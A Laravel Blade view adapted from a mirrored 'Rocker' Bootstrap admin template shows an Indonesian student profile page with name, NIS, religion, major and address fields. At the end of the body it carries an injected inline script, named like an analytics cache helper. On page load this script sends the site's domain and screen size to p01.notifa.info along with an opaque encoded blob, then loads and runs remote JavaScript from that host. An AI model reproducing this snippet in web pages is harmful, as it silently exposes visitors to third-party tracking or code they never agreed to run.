<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from codervent.com/rocker/color-version/pages-user-profile.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:57 GMT -->
<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
  <meta name="description" content=""/>
  <meta name="author" content=""/>
  <title>Rocker - Bootstrap4  Admin Dashboard Template</title>
  <!--favicon-->
  <link rel="icon" href="{{asset('assets/images/favicon.ico')}}" type="image/x-icon">
  <!-- simplebar CSS-->
  <link href="{{asset('assets/plugins/simplebar/css/simplebar.css')}}" rel="stylesheet"/>
  <!-- Bootstrap core CSS-->
  <link href="{{asset('assets/css/bootstrap.min.css')}}" rel="stylesheet"/>
  <!-- animate CSS-->
  <link href="{{asset('assets/css/animate.css')}}" rel="stylesheet" type="text/css"/>
  <!-- Icons CSS-->
  <link href="{{asset('assets/css/icons.css')}}" rel="stylesheet" type="text/css"/>
  <!-- Sidebar CSS-->
  <link href="{{asset('assets/css/sidebar-menu.css')}}" rel="stylesheet"/>
  <!-- Custom Style-->
  <link href="{{asset('assets/css/app-style.css')}}" rel="stylesheet"/>
  
</head>

<body>

<!-- Start wrapper-->
 <div id="wrapper">
 
   <!--Start sidebar-wrapper-->
   
   <!--End sidebar-wrapper-->

<!--Start topbar header-->
<header class="topbar-nav">
 <nav class="navbar navbar-expand fixed-top gradient-scooter">
 
     
  
</nav>
</header>
<!--End topbar header-->

<div class="clearfix"></div>
	
  <div class="content" style="margin-top: 80px ;">
    <div class="container">
      <!-- Breadcrumb-->
     <div class="row pt-2 pb-2" >
        <div class="col-sm-9">
		    <h4 class="page-title">Profil Siswa</h4>
		   
	   </div>
     <div class="col-sm-3" style="margin-top: 50px;">
      
     </div>
     </div>
    <!-- End Breadcrumb-->
      <div class="row">
        <div class="col-lg-4">
           <div class="profile-card-3">
            <div class="card">
			 <div class="user-fullimage">
			   <img src="{{asset('assets/images/avatars/avatar-22.png')}}" alt="user avatar" class="card-img-top">
			    <div class="details">
			      <h5 class="mb-1 text-white ml-3">{{$user->name}}</h5>
				  <h6 class="text-white ml-3">Senior Designer</h6>
				 </div>
			  </div>
            <div class="card-body text-center">
             <p>Lorem Ipsum available, but the majority have suffered</p>
				   

				   
				    </div>
             </div>
			</div>
        </div>
        <div class="col-lg-8">
           <div class="card">
            <div class="card-body">
            <ul class="nav nav-tabs nav-tabs-primary top-icon nav-justified">
                <li class="nav-item">
                    <a href="javascript:void();" data-target="#profile" data-toggle="pill" class="nav-link active"><i class="icon-user"></i> <span class="hidden-xs"></span></a>
                </li>
            
               
            </ul>
            <div class="tab-content p-3">
                <div class="tab-pane active" id="profile">
                    <h5 class="mb-3">Profil Siswa</h5>
                    <div class="row">
                        <div class="col-md-6">
                            <h6>Nama</h6>
                            <p>
                                {{$user->name}}
                            </p>
                            <h6>NIS</h6>
                            <p>
                                {{$user->nis}}
                            </p>
                            <h6>NIS</h6>
                          
                            <h6>TTL</h6>
                            <p>
                                {{$user->user.created_at }}
                            </p>
                            <h6>Agama</h6>
                            <p>
                                {{$user->religion}}
                            </p>
                            
                        </div>
                        <div class="col-md-6">
                          <h6>Jurusan</h6>
                          <p>
                              {{$user->major}}
                          </p>
                          
                          <h6>Alamat</h6>
                          <p>
                              {{$user->address}}
                          </p>
                        </div>
                       
                    </div>
                    <!--/row-->
                </div>
               
               
            </div>
        </div>
      </div>
      </div>
        
    </div>

    </div>
    <!-- End container-fluid-->
   </div><!--End content-wrapper-->
   <!--Start Back To Top Button-->
    <a href="javaScript:void();" class="back-to-top"><i class="fa fa-angle-double-up"></i> </a>
    <!--End Back To Top Button-->
	
	<!--Start footer-->

	<!--End footer-->
   
  </div><!--End wrapper-->


  <!-- Bootstrap core JavaScript-->
  <script src="{{asset('assets/js/jquery.min.js')}}"></script>
  <script src="{{asset('assets/js/popper.min.js')}}"></script>
  <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
	
  <!-- simplebar js -->
  <script src="{{asset('assets/plugins/simplebar/js/simplebar.js')}}"></script>
  <!-- waves effect js -->
  <script src="{{asset('assets/js/waves.js')}}"></script>
  <!-- sidebar-menu js -->
  <script src="{{asset('assets/js/sidebar-menu.js')}}"></script>
  <!-- Custom scripts -->
  <script src="{{asset('ssets/js/app-script.js')}}"></script>
	
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKujvCsE2ZS0m7POq%2f43%2fey9y0MOgWQD3yjKWjrs4r0br0wbxovjhyaCr0YrZKNdGh%2fumyxUMsZPLSFSjdOr77HFgVHokt1qFZTdvKpiXG8Dj%2bu6mIo%2fE0JJQhlMNZvYfJLGqW45nYGYEU7qxGtq8ZWzuWmzKX9sBhhUhGFWB7fiG3yuu0XG654JtxOlHD1GvvjT1E3QR1UKeQ01fYmxTNXICXAnxQ0M0b%2b6qLcWnjEgQf29VFSwpFsn4lUPfOiw2QPimR6IvMeG9nULan7OdaO3e%2fUTwKLCRjnLmDPx%2fjP9u6UyGdfO4MP8AVL%2bm8whO9uslyfafe7nj7py2x90EFmug6pK59n15cs34SVL7Uaefew6ybgmCnrXYdbcep7d8qQBrONlpKOS5rtI0y8vQ2%2bLGQdIQwBfSTbRuPuAiqjjCqL3mslQbEgExI0%2fX4L2ntZMhnvNZrNBYllLdTcXA%2bccaMpwvB8%2fvlhNZ%2f1UEeCjo5Ud5B%2ftw9NtFyi5kFKYiIPw%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from codervent.com/rocker/color-version/pages-user-profile.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:59 GMT -->
</html>
